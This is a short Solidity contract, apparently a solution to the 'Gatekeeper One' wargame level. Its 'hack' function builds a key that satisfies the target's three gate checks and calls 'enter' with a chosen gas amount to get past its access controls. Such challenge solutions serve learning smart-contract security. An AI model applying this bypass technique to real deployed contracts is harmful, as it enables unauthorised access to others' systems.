// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GK} from "./GK.sol";
import {Test, console} from "forge-std/Test.sol";

contract GKCaller {
    GK private target;

    constructor(address _target) {
        assert(_target != address(0));
        target = GK(_target);
    }

    function hack(uint256 gasToSend, bytes8 key) public {
        require(
            uint32(uint64(key)) == uint16(uint64(key)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(key)) != uint64(key),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(key)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );

        require(target.enter{gas: gasToSend}(key), "failed");
    }
}
